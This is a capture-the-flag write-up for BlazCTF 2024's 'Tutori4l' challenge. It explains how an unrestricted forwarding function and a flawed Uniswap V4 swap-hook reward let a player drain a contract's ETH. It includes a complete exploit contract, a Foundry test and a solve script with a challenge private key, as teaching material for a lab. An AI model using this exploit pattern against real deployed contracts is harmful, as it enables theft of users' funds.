# Tutori4l
*"Uniswap V4 sounds like a scam", said Tony. Nevertheless, our simp still decided to try it out. He deployed his next token with a Uniswap V4 pool and planning to rug it in 15 minutes. Help FBI stop him.*

Tags: Solidity, Defi

Author: [0xAWM](https://x.com/i0xAWM)

This challenge was a part of [Fuzzland's BlazCTF 2024](https://ctf.blaz.ai) and was solved by 21 teams.

Challenge code accessible [here](https://github.com/fuzzland/blazctf-2024/tree/main/tutori4l).
## Introduction
In the handouts was the following contract (comments not included):
```solidity
// src/challenge.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";

import {ERC20} from "../src/ERC20.sol";
import {Hook} from "../src/Hook.sol";
import {HookMiner} from "../src/HookMiner.sol";

contract Challenge {
    using CurrencyLibrary for Currency;

    address immutable token;
    address immutable player;
    Hook immutable hook;
    PoolManager immutable manager;

    constructor(address _player, PoolManager _manager) payable {
        player = _player;
        token = address(new ERC20("Token", "T2"));
        manager = _manager;

        uint160 flags = uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG);
        (address hookAddress, bytes32 salt) =
            HookMiner.find(address(this), flags, type(Hook).creationCode, abi.encode(address(manager)));
        hook = new Hook{salt: salt}(manager);
        assert(hookAddress == address(hook));

        uint160 startingPrice = 79228162514264337593543950336;
        PoolKey memory pool = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0,
            tickSpacing: 10,
            hooks: hook
        });
        PoolId lucky_pool = PoolIdLibrary.toId(pool);
        hook.set_lucky_pool(lucky_pool);
        manager.initialize(pool, startingPrice, new bytes(0));
    }

    uint256 start_block;

    function arbitrary(address a, bytes calldata data) external payable {
        if (start_block != 0) {
            require(msg.value >= (block.number - start_block) * 9e17, "insufficient fee");
        }
        start_block = block.number;
        if (a == address(this) || a == address(hook)) {
            (bool success,) = a.call{value: address(this).balance}(data);
            require(success, "call failed");
        } else if (a == msg.sender || a == address(manager)) {
            (bool success,) = a.call{value: msg.value}(data);
            require(success, "call failed");
        } else {
            start_block--;
            (bool success,) = a.call(data);
            require(success, "call failed");
        }
    }

    receive() external payable {}

    function isSolved() external view returns (bool) {
        return player.balance >= 19e17;
    }
}
```
A [Uniswap V4](https://docs.uniswap.org/contracts/v4/overview) Hook has been deployed for an ETH->Token pool.

The Challenge contract, as well as the player, have been set up with 1 ETH balance.

Can you get the Challenge contract's money?

The flag would be given if the player (solver) could get a balance of at least 1.9 ETH as seen in the `isSolved()` function.

Also included were the RPC endpoints, the private key of the player and the address of the Challenge contract.

## The Challenge
The Hook contract can be seen below:
```solidity
// src/Hook.sol
pragma solidity ^0.8.24;

import {BaseHook} from "v4-periphery/src/base/hooks/BaseHook.sol";

import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary} from "v4-core/src/types/BeforeSwapDelta.sol";

contract Hook is BaseHook {
    using PoolIdLibrary for PoolKey;
    using PoolIdLibrary for PoolId;

    PoolId lucky_pool;
    bool unlock;
    mapping(PoolId => bool) public has_reward;

    modifier in_swap() {
        require(unlock, "swap_unlock");
        _;
    }

    modifier only_pool_manager() {
        require(msg.sender == address(poolManager), "not_pool_manager");
        _;
    }

    constructor(IPoolManager _poolManager) BaseHook(_poolManager) {}

    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: false,
            afterInitialize: false,
            beforeAddLiquidity: false,
            afterAddLiquidity: false,
            beforeRemoveLiquidity: false,
            afterRemoveLiquidity: false,
            beforeSwap: true,
            afterSwap: true,
            beforeDonate: false,
            afterDonate: false,
            beforeSwapReturnDelta: false,
            afterSwapReturnDelta: false,
            afterAddLiquidityReturnDelta: false,
            afterRemoveLiquidityReturnDelta: false
        });
    }

    function set_lucky_pool(PoolId _lucky_pool) external {
        require(PoolId.unwrap(lucky_pool) == bytes32(0), "lucky_pool_already_set");
        lucky_pool = _lucky_pool;
    }

    function set_reward() external payable {
        if (msg.value >= 1 ether) {
            has_reward[lucky_pool] = true;
        }
    }

    function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata hookData)
        external
        override
        only_pool_manager
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        unlock = true;
        PoolId id = key.toId();
        if (
            has_reward[id] && params.zeroForOne && key.currency0 == Currency.wrap(address(0))
                && params.amountSpecified < -1 ether
        ) {
            first_reward(params, hookData);
            has_reward[id] = false;
        }
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }

    function afterSwap(address, PoolKey calldata, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata)
        external
        override
        only_pool_manager
        returns (bytes4, int128)
    {
        unlock = false;
        return (BaseHook.afterSwap.selector, 0);
    }

    function first_reward(IPoolManager.SwapParams calldata params, bytes calldata hookData) public in_swap {
        if (hookData.length != 0x20) {
            return;
        }
        address recipient = abi.decode(hookData, (address));
        uint256 max_reward = uint256(-params.amountSpecified - 1 ether) / 1000;

        bool success;
        if (tx.origin == recipient) {
            (success,) =
                recipient.call{value: max_reward < address(this).balance ? max_reward : address(this).balance}("");
        }
        if (recipient.balance > 0) {
            address origin = address(uint160(tx.origin) / 11);
            (success,) = origin.call{value: address(this).balance}("");
        }

        uint256 reward = max_reward < address(this).balance ? max_reward : address(this).balance;
        (success,) = recipient.call{value: reward}("");
    }
}
```

As we can see, the Hook has two swap hooks: `beforeSwap` and `afterSwap`.

As the names state, the hooks are called before and after swaps, as seen in [this line](https://github.com/fuzzland/blazctf-2024/blob/main/tutori4l/challenge/project/lib/v4-core/src/PoolManager.sol#L203) and [this line](https://github.com/fuzzland/blazctf-2024/blob/main/tutori4l/challenge/project/lib/v4-core/src/PoolManager.sol#L222).

From the `beforeSwap` hook:
```solidity
    function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata hookData)
        external
        override
        only_pool_manager
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        unlock = true;
        PoolId id = key.toId();
        if (
            has_reward[id] && params.zeroForOne && key.currency0 == Currency.wrap(address(0))
                && params.amountSpecified < -1 ether
        ) {
            first_reward(params, hookData);
            has_reward[id] = false;
        }
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
```

We can see, that if the pool has a reward tagged on it (`has_reward[id]`), the swap is a token0->token1 swap (`params.zeroForOne`), the token0 is native Ether (`key.currency0 == Currency.wrap(address(0)`) AND that the amount specified is less than `-1 ether` (meaning that the user will provide an input more than `1 ether` of tokens), then the `first_reward` function will be called.

Here is the `first_reward` function:
```solidity
    function first_reward(IPoolManager.SwapParams calldata params, bytes calldata hookData) public in_swap {
        if (hookData.length != 0x20) {
            return;
        }
        address recipient = abi.decode(hookData, (address));
        uint256 max_reward = uint256(-params.amountSpecified - 1 ether) / 1000;

        bool success;
        if (tx.origin == recipient) {
            (success,) =
                recipient.call{value: max_reward < address(this).balance ? max_reward : address(this).balance}("");
        }
        if (recipient.balance > 0) {
            address origin = address(uint160(tx.origin) / 11);
            (success,) = origin.call{value: address(this).balance}("");
        }

        uint256 reward = max_reward < address(this).balance ? max_reward : address(this).balance;
        (success,) = recipient.call{value: reward}("");
    }
```
As we can see, the user-provided hookData will be decoded into a recipient address, and the first swapper on the pool will get a reward of `(-params.amountSpecified - 1 ether) / 1000` ETH.
After that has been calculated, the ETH will be sent to the recipient (provided `tx.origin == recipient`)

So, if we could get some ETH into the hook address, we could potentially take it.

## The Solution
Going back to our Challenge contract, we can see the following function:
```solidity
function arbitrary(address a, bytes calldata data) external payable {
    if (start_block != 0) {
        require(msg.value >= (block.number - start_block) * 9e17, "insufficient fee");
    }
    start_block = block.number;
    if (a == address(this) || a == address(hook)) {
        (bool success,) = a.call{value: address(this).balance}(data);
        require(success, "call failed");
    } else if (a == msg.sender || a == address(manager)) {
        (bool success,) = a.call{value: msg.value}(data);
        require(success, "call failed");
    } else {
        start_block--;
        (bool success,) = a.call(data);
        require(success, "call failed");
    }
}
```
Specifically, this branch:
```solidity
if (a == address(this) || a == address(hook)) {
    (bool success,) = a.call{value: address(this).balance}(data);
    require(success, "call failed");
```
Since there are no restrictions on calling the function, if we set the target address to the hook, we could send **all** of the ETH in the Challenge contract to the hook, alongside our arbitrary calldata.

To set the reward for the pool on the hook contract, we need to call the `set_reward()` function:
```solidity
function set_reward() external payable {
    if (msg.value >= 1 ether) {
        has_reward[lucky_pool] = true;
    }
}
```

So to get the ETH from Challenge to Hook, we would craft the following tx:
```solidity
Challenge(payable(challenge)).arbitrary(hook, abi.encodeWithSignature("set_reward()"));
```
The hook will now have a balance of 1 ETH.

From then on, we need to get the ETH out of there.

From before, we know which conditions to meet:

*We can see, that if the pool has a reward tagged on it (`has_reward[id]`), the swap is a token0->token1 swap (`params.zeroForOne`), the token0 is native Ether (`key.currency0 == Currency.wrap(address(0)`) AND that the amount specified is less than `-1 ether` (meaning that the user will provide an input more than `1 ether` of tokens), then the `first_reward` function will be called.*

The interface of the `swap()` function on the PoolManager is the following:
```solidity
function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)
    external
    returns (BalanceDelta swapDelta);
```
where `PoolKey` is 
```solidity
struct PoolKey {
    /// @notice The lower currency of the pool, sorted numerically
    Currency currency0;
    /// @notice The higher currency of the pool, sorted numerically
    Currency currency1;
    /// @notice The pool LP fee, capped at 1_000_000. If the highest bit is 1, the pool has a dynamic fee and must be exactly equal to 0x800000
    uint24 fee;
    /// @notice Ticks that involve positions must be a multiple of tick spacing
    int24 tickSpacing;
    /// @notice The hooks of the pool
    IHooks hooks;
}
```
and `SwapParams` is
```solidity
struct SwapParams {
    /// Whether to swap token0 for token1 or vice versa
    bool zeroForOne;
    /// The desired input amount if negative (exactIn), or the desired output amount if positive (exactOut)
    int256 amountSpecified;
    /// The sqrt price at which, if reached, the swap will stop executing
    uint160 sqrtPriceLimitX96;
}
```

We can now construct the data to use for our swap.

`PoolKey memory key` is the data that calculates the ID of our pool, and can be found in [`challenge.sol`](https://github.com/fuzzland/blazctf-2024/blob/main/tutori4l/challenge/project/src/challenge.sol).

`SwapParams memory params` can be constructed like this:

- `zeroForOne`: `true`, since that was one of the conditions for our reward

- `amountSpecified`: `-1001 ether`, since we need to sweep 1 ETH from the contract, so the reward formula `(-params.amountSpecified - 1 ether) / 1000` must amount to 1 ETH

- `sqrtPriceLimitX96`: `type(uint96).max`, since the `startingPrice` in [`challenge.sol`](https://github.com/fuzzland/blazctf-2024/blob/main/tutori4l/challenge/project/src/challenge.sol) was `79228162514264337593543950336`, or `type(uint96).max + 1`          

We would otherwise run into this check in [`Pool.sol`](https://github.com/fuzzland/blazctf-2024/blob/main/tutori4l/challenge/project/lib/v4-core/src/libraries/Pool.sol#L324), which prevents the limit from exceeding that number:
```
if (params.sqrtPriceLimitX96 >= slot0Start.sqrtPriceX96()) {
    PriceLimitAlreadyExceeded.selector.revertWith(slot0Start.sqrtPriceX96(), params.sqrtPriceLimitX96);
}
```
`hookData` as we remember, needs to be 20-bytes in length, and be an encoded version of the recipient address: `abi.encode(recipient)`

Structs:
```solidity
SwapParams({
    zeroForOne: true, 
    amountSpecified: -1001 ether,
    sqrtPriceLimitX96: uint160(type(uint96).max)
});

PoolKey memory pool = PoolKey({
    currency0: Currency.wrap(address(0)),
    currency1: Currency.wrap(token),
    fee: 0,
    tickSpacing: 10,
    hooks: hook
});
```

We now have the data required for our swap.

But that's not quite it yet.

The `swap()` function in the `PoolManager` contract has a modifier `onlyWhenUnlocked`:
```solidity
modifier onlyWhenUnlocked() {
    if (!Lock.isUnlocked()) ManagerLocked.selector.revertWith();
    _;
}
```

This check will fail, unless we can unlock the contract, with the `unlock` function:
```solidity
function unlock(bytes calldata data) external override returns (bytes memory result) {
    if (Lock.isUnlocked()) AlreadyUnlocked.selector.revertWith();

    Lock.unlock();

    // the caller does everything in this callback, including paying what they owe via calls to settle
    result = IUnlockCallback(msg.sender).unlockCallback(data);

    if (NonzeroDeltaCount.read() != 0) CurrencyNotSettled.selector.revertWith();
    Lock.lock();
}
```
More about this can be found [here](https://docs.uniswap.org/contracts/v4/guides/unlock-callback).

As we can see, this will unlock the contract for only one transaction, and needs to call a callback function on `msg.sender`. This means that we cannot execute the swap from an EOA, but will have to do it through a contract.

Since we have all the data we need for the swap, we can code the contract:
```solidity
// src/HookSweep.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {Hook} from "src/Hook.sol";

contract HookSweep {
    address hook = 0x7400872EE85d4546F9CB4Fa776c43B5E0c78C0C0;
    address manager = 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512;
    address token = 0x75537828f2ce51be7289709686A69CbFDbB714F1;

    constructor(address _hook, address _manager, address _token) {
        hook = _hook;
        manager = _manager;
        token = _token;
    }

    function swap() external {
        IPoolManager(manager).unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        PoolKey memory pool = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0,
            tickSpacing: 10,
            hooks: Hook(hook)
        });
        IPoolManager(manager).swap(
            pool, IPoolManager.SwapParams(true, -1001 ether, type(uint96).max), abi.encode(tx.origin)
        );
        return "";
    }
}
```

The contract works like this:
- Player calls `swap()`
- `swap()` calls `PoolManager.unlock()`
- `unlock()` calls `HookSweep.unlockCallBack()`
- `unlockCallBack()` calls `PoolManager.swap()`, as the contract is now unlocked

Let's put all of this knowledge to the test with a Foundry test:
```solidity
// test/Sweep.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {Challenge} from "src/challenge.sol";
import {HookSweep} from "src/HookSweep.sol";

contract SweepTest is Test {
    address player;
    address challenge;
    address hook;
    address manager;
    address token;
    HookSweep sweeper;

    function setUp() public {
        vm.createSelectFork("CHALLENGE_RPC_URL");
        player = vm.addr(0xf2bb452a08e478f366f18a4c3e7d166f1ceac95a2e06b7f6ec2f45914d4ccee3);
        challenge = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;
        // fetched addresses
        token = 0x75537828f2ce51be7289709686A69CbFDbB714F1;
        hook = 0x7400872EE85d4546F9CB4Fa776c43B5E0c78C0C0;
        manager = 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512;

        sweeper = new HookSweep(hook, manager, token);
    }

    function test_SweepHook() public {
        // set reward on the hook for our pool
        Challenge(payable(challenge)).arbitrary(hook, abi.encodeWithSignature("set_reward()"));

        console2.log("Player's ETH balance before: %18e", player.balance);
        // using instead of prank to set tx.origin to the player as well
        vm.broadcast(player);
        sweeper.swap();
        console2.log("Player's ETH balance after: %18e", player.balance);
        assertEq(player.balance, 2 ether);
    }
}

```

It worked! The player's balance became 2 ETH:
```
Logs:
  Player's balance before:  1000000000000000000
  Player's balance after:  2000000000000000000
```

One might wonder how the swap goes through, if we are giving an input of `1001 ether`, while not having that amount.
In `challenge.sol`, the pool was initialized, but was without liquidity.

This means that in the `Pool.sol` contract, no swapping actually takes place in the `swap` function, resulting in the delta calculated here to result in 0:
```solidity
swapDelta = toBalanceDelta(
    (params.amountSpecified - amountSpecifiedRemaining).toInt128(), amountCalculated.toInt128()
);
```
Which means that no tokens are requested from us.

We can now write a Foundry script to deploy our contract and make our swap:
```solidity
// script/Solve.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {HookSweep} from "src/HookSweep.sol";
import {Challenge} from "src/challenge.sol";

contract Solve is Script {
    function run() external {
        uint256 privateKey = 0xf2bb452a08e478f366f18a4c3e7d166f1ceac95a2e06b7f6ec2f45914d4ccee3;
        address challenge = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;
        // fetched addresses
        address token = 0x75537828f2ce51be7289709686A69CbFDbB714F1;
        address hook = 0x7400872EE85d4546F9CB4Fa776c43B5E0c78C0C0;
        address manager = 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512;

        vm.startBroadcast(privateKey);
        Challenge(payable(challenge)).arbitrary(hook, abi.encodeWithSignature("set_reward()"));
        HookSweep sweeper = new HookSweep(hook, manager, token);
        sweeper.swap();
        vm.stopBroadcast();
    }
}
```

Running this script using `forge script` yields us our expected result and we can now get our flag:

![image](https://github.com/user-attachments/assets/85f8828a-792f-47da-8586-3889593f8fbd)


